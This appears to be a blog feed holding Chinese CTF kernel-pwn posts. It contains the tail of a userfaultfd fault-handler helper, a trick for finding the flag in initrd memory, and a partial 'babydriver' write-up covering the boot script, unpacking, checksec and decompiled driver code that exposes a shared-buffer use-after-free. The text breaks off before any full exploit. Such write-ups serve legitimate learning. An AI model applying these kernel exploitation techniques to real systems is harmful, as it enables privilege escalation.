punctuation">,</span> <span class="token operator">&amp;</span>msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>nread <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"EOF on userfaultfd!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>nread <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>event <span class="token operator">!=</span> UFFD_EVENT_PAGEFAULT<span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Unexpected event on userfaultfd\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> uffd_src_page<span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>dst <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>address <span class="token operator">&amp;</span>                                              <span class="token operator">~</span><span class="token punctuation">(</span>uffd_src_page_size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>len <span class="token operator">=</span> page_size<span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>mode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>copy <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_COPY<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_copy<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"ioctl-UFFDIO_COPY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h2><h3 id="内存中直接搜索flag"><a href="#内存中直接搜索flag" class="headerlink" title="内存中直接搜索flag"></a>内存中直接搜索flag</h3><p><code>Initial RAM disk</code>（<code>initrd</code>）提供了在 <code>boot loader</code> 阶段载入一个 <code>RAM disk</code> 并挂载为根文件系统的能力，从而在该阶段运行一些用户态程序，在完成该阶段工作之后才是挂载真正的根文件系统</p><p><code>initrd</code>文件系统镜像通常为<code>gzip</code>格式，在启动阶段由<code>boot loader</code>将其路径传给<code>kernel</code>，自<code>2.6</code>版本后出现了使用<code>cpio</code>格式的<code>initramfs</code>，从而无需挂载便能展开为一个文件系统</p><p><code>initrd/initramfs</code>的特点是文件系统中的所有内容都会被读取到内存当中，而大部分 <code>CTF</code> 中的 <code>kernel pwn</code> 题目都选择直接将 <code>initrd</code> 作为根文件系统，因此若是我们有内存搜索能力就能直接在内存空间中搜索<code>flag</code>的内容</p>]]></content>
      
      
      <categories>
          
          <category> kernel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_babydriver-kernel_pwn解题一般过程</title>
      <link href="/2024/03/18/ciscn-babydriver-kernel-pwn-jie-ti-yi-ban-guo-cheng/ciscn-babydriver-kernel-pwn-jie-ti-yi-ban-guo-cheng/"/>
      <url>/2024/03/18/ciscn-babydriver-kernel-pwn-jie-ti-yi-ban-guo-cheng/ciscn-babydriver-kernel-pwn-jie-ti-yi-ban-guo-cheng/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>查看<code>boot.sh</code>，开启了<code>smep</code>用户代码不可执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>qemu-system-x86_64 <span class="token punctuation">\</span>        <span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span>        <span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span>        <span class="token parameter variable">-append</span> <span class="token string">'console=ttyS0 root=/dev/ram oops=panic panic=1'</span> <span class="token punctuation">\</span>        <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>        <span class="token parameter variable">-m</span> 128M <span class="token punctuation">\</span>        <span class="token parameter variable">-nographic</span>  <span class="token punctuation">\</span>        <span class="token parameter variable">-smp</span> <span class="token assign-left variable">cores</span><span class="token operator">=</span><span class="token number">1</span>,threads<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">\</span>        <span class="token parameter variable">-cpu</span> kvm64,+smep <span class="token punctuation">\</span>        <span class="token parameter variable">-s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行<code>./boot.sh</code>，查看权限是<code>ctf</code>，需要提权到<code>root</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/ $ <span class="token function">id</span><span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>ctf<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>ctf<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>ctf<span class="token punctuation">)</span>/ $ <span class="token builtin class-name">cd</span> /home/ctf~ $ <span class="token function">ls</span>~ $ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先解包<code>rootfs.cpio</code>得到驱动</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">⚡  <span class="token function">mkdir</span> File_system⚡  <span class="token function">mv</span> rootfs.cpio ./File_system/rootfs.cpio.gz⚡  <span class="token builtin class-name">cd</span> File_system⚡  gunzip rootfs.cpio.gz⚡  cpio <span class="token parameter variable">-idmv</span> <span class="token operator">&lt;</span> rootfs.cpio<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看文件系统里的<code>init</code>文件，发现<code>root</code>权限才能查看<code>flag</code>，内核版本是<code>4.4.72</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span> <span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mount</span> <span class="token parameter variable">-t</span> sysfs none /sys<span class="token function">mount</span> <span class="token parameter variable">-t</span> devtmpfs devtmpfs /dev<span class="token function">chown</span> root:root flag<span class="token function">chmod</span> <span class="token number">400</span> flag<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/dev/console<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/console<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/consoleinsmod /lib/modules/4.4.72/babydriver.ko<span class="token function">chmod</span> <span class="token number">777</span> /dev/babydev<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span>setsid cttyhack setuidgid <span class="token number">1000</span> <span class="token function">sh</span><span class="token function">umount</span> /proc<span class="token function">umount</span> /syspoweroff <span class="token parameter variable">-d</span> <span class="token number">0</span>  <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>找到<code>ko</code>文件，在<code>File_system/lib/modules/4.4.72/babydriver.ko</code>，查看文件信息，开了<code>NX</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">⚡  <span class="token function">file</span> babydriver.ko      babydriver.ko: ELF <span class="token number">64</span>-bit LSB relocatable, x86-64, version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>8ec63f63d3d3b4214950edacf9e65ad76e0e00e7, with debug_info, not stripped⚡  checksec babydriver.ko     Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x0<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析程序，完全没学过，丢给<code>gpt</code>了</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">babydriver_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// 用于存储返回值或错误码</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// 用于存储返回值或错误码</span>  class <span class="token operator">*</span>v2<span class="token punctuation">;</span> <span class="token comment">// 用于存储设备类指针</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// 用于存储返回值或错误码</span>  <span class="token comment">// 分配字符设备的主设备号，并将其存储在 babydev_no 变量中</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>babydev_no<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token string">"babydev"</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">// 初始化字符设备 cdev_0，并将其关联的文件操作结构体 fops 设置为 &amp;fops</span>    <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cdev_0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>fops<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 将字符设备的所有者指定为当前内核模块</span>    cdev_0<span class="token punctuation">.</span>owner <span class="token operator">=</span> <span class="token operator">&amp;</span>_this_module<span class="token punctuation">;</span>    <span class="token comment">// 向系统添加字符设备 cdev_0，使用分配的主设备号 babydev_no，并指定设备数为1</span>    v1 <span class="token operator">=</span> <span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cdev_0<span class="token punctuation">,</span> babydev_no<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 如果添加成功，则返回值大于等于0</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token comment">// 创建一个设备类，名称为 "babydev"，并将其与主设备号 babydev_no 相关联</span>      v2 <span class="token operator">=</span> <span class="token punctuation">(</span>class <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">_class_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>_this_module<span class="token punctuation">,</span> <span class="token string">"babydev"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>babydev_no<span class="token punctuation">)</span><span class="token punctuation">;</span>      babydev_class <span class="token operator">=</span> v2<span class="token punctuation">;</span>      <span class="token comment">// 如果设备类创建成功</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token comment">// 在 /dev 目录下创建一个设备节点，名称为 "babydev"，并将其与设备类 v2 和主设备号 babydev_no 相关联</span>        v3 <span class="token operator">=</span> <span class="token function">device_create</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> babydev_no<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token string">"babydev"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v0 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment">// 如果设备节点创建成功，则返回0</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span>          <span class="token keyword">return</span> v0<span class="token punctuation">;</span>        <span class="token comment">// 输出内核信息日志，表示设备节点创建失败</span>        <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_351<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 销毁之前创建的设备类</span>        <span class="token function">class_destroy</span><span class="token punctuation">(</span>babydev_class<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>        <span class="token comment">// 输出内核信息日志，表示设备类创建失败</span>        <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_33B<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token comment">// 从内核中删除字符设备</span>      <span class="token function">cdev_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cdev_0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>      <span class="token comment">// 输出内核信息日志，表示添加字符设备失败</span>      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_327<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 注销之前分配的字符设备号</span>    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>babydev_no<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> v1<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// 输出内核信息日志，表示分配字符设备的主设备号失败</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_309<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该函数用于进行初始化来设置参数，分配字符设备的主设备号<code>babydev_no</code>，使用分配的主设备号添加字符设备<code>cdev_0</code>，创建名称为 <code>babydev</code>的设备类并与主设备号相关联，**<code>/dev</code>**目录下创建一个名称为<code>babydev</code>的设备节点并将其与设备类和主设备号相关联，以上全部成功则<code>return 0</code>，否则销毁前面步骤的结果并输出错误信息</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __cdecl <span class="token function">babydriver_exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 销毁设备节点</span>  <span class="token function">device_destroy</span><span class="token punctuation">(</span>babydev_class<span class="token punctuation">,</span> babydev_no<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 销毁设备类</span>  <span class="token function">class_destroy</span><span class="token punctuation">(</span>babydev_class<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 从内核中删除字符设备</span>  <span class="token function">cdev_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cdev_0<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 注销之前分配的字符设备号</span>  <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>babydev_no<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该函数主要就是在退出时收回<code>init</code>时创建的设备</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">babyopen</span><span class="token punctuation">(</span>inode <span class="token operator">*</span>inode<span class="token punctuation">,</span> file <span class="token operator">*</span>filp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 分配内核缓冲区内存</span>  babydev_struct<span class="token punctuation">.</span>device_buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmem_cache_alloc_trace</span><span class="token punctuation">(</span>kmalloc_caches<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">37748928LL</span><span class="token punctuation">,</span> <span class="token number">64LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 设置内核缓冲区长度</span>  babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">=</span> <span class="token number">64LL</span><span class="token punctuation">;</span>  <span class="token comment">// 输出设备打开信息</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"device open\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">ssize_t</span> __fastcall <span class="token function">babyread</span><span class="token punctuation">(</span>file <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> <span class="token class-name">size_t</span> length<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span>offset<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">size_t</span> v4<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token class-name">ssize_t</span> result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token class-name">ssize_t</span> v6<span class="token punctuation">;</span> <span class="token comment">// rbx</span>  <span class="token comment">// 输出文件读取信息</span>  <span class="token function">_fentry__</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 如果设备缓冲区为空，则返回错误码</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>babydev_struct<span class="token punctuation">.</span>device_buf <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1LL</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2LL</span><span class="token punctuation">;</span>  <span class="token comment">// 如果设备缓冲区长度大于指定长度</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">></span> v4 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">// 将数据从内核缓冲区复制到用户缓冲区</span>    v6 <span class="token operator">=</span> v4<span class="token punctuation">;</span>    <span class="token function">copy_to_user</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> v6<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">ssize_t</span> __fastcall <span class="token function">babywrite</span><span class="token punctuation">(</span>file <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> <span class="token class-name">size_t</span> length<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span>offset<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">size_t</span> v4<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token class-name">ssize_t</span> result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token class-name">ssize_t</span> v6<span class="token punctuation">;</span> <span class="token comment">// rbx</span>  <span class="token comment">// 输出文件写入信息</span>  <span class="token function">_fentry__</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 如果设备缓冲区为空，则返回错误码</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>babydev_struct<span class="token punctuation">.</span>device_buf <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1LL</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2LL</span><span class="token punctuation">;</span>  <span class="token comment">// 如果设备缓冲区长度大于指定长度</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">></span> v4 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">// 将数据从用户缓冲区复制到内核缓冲区</span>    v6 <span class="token operator">=</span> v4<span class="token punctuation">;</span>    <span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> v6<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和正常<code>orw</code>感觉差不多，<code>open</code>对<code>babydev_struct</code>分配内存</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">babyrelease</span><span class="token punctuation">(</span>inode <span class="token operator">*</span>inode<span class="token punctuation">,</span> file <span class="token operator">*</span>filp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 输出设备释放信息</span>  <span class="token function">_fentry__</span><span class="token punctuation">(</span>inode<span class="token punctuation">,</span> filp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 释放设备缓冲区</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>babydev_struct<span class="token punctuation">.</span>device_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"device release\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>类似<code>free</code>，对<code>babydev_struct</code>释放内存</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">babyioctl</span><span class="token punctuation">(</span>file <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> command<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 arg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">size_t</span> v3<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token class-name">size_t</span> v4<span class="token punctuation">;</span> <span class="token comment">// rbx</span>  <span class="token comment">// 输出ioctl操作信息</span>  <span class="token function">_fentry__</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> v3<span class="token punctuation">;</span>  <span class="token comment">// 如果命令为0x10001</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> command <span class="token operator">==</span> <span class="token number">0x10001</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">// 释放原有的设备缓冲区</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>babydev_struct<span class="token punctuation">.</span>device_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 重新分配设备缓冲区</span>    babydev_struct<span class="token punctuation">.</span>device_buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">_kmalloc</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token number">0x24000C0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 设置设备缓冲区长度</span>    babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">=</span> v4<span class="token punctuation">;</span>    <span class="token comment">// 输出分配完成信息</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"alloc done\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">// 输出未知命令信息</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2EB<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>ioctl</code> 函数是用于进行设备 I&#x2F;O 控制的系统调用，它允许用户空间程序与设备驱动程序进行通信，以控制设备的各种操作</p><p>函数原型：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">cCopy code<span class="token keyword">int</span> <span class="token function">ioctl</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> request<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>参数解释：</p><ul><li><code>fd</code>：文件描述符，用于标识要进行 I&#x2F;O 控制的设备。</li><li><code>request</code>：无符号长整型参数，用于指定要执行的操作或控制命令。</li><li><code>...</code>：可选参数，用于传递与 <code>request</code> 相关的数据或结构体。参数类型和数量取决于所执行的具体操作。</li></ul><p>参数详解：</p><ul><li><code>fd</code>：文件描述符通常是通过文件打开操作（例如 <code>open</code> 函数）获得的，用于标识要进行 <code>I/O</code> 控制的设备。</li><li><code>request</code>：这是一个无符号长整型参数，通常是一个设备特定的控制命令或操作码。<code>ioctl</code> 函数的具体行为由 <code>request</code> 参数确定，每个设备驱动程序都会定义一组支持的 <code>request</code> 值，以便用户程序能够控制设备的各种操作。</li><li><code>...</code>：这是一个可选的参数列表，用于传递与 <code>request</code> 相关的数据或结构体。具体的参数类型和数量取决于所执行的具体操作。例如，如果 <code>request</code> 是用于设置设备参数的命令，则后续参数可能是一个指向包含新参数值的结构体的指针。</li></ul><p>返回值：</p><ul><li><code>ioctl</code> 函数执行成功时返回 0，否则返回 -1，并设置 <code>errno</code> 表示错误类型。</li></ul></blockquote><p>题目中的该函数三个参数分别是文件描述符、操作码、缓冲区长度</p><h2 id="调试"><a href="#调试" class="headerlink" 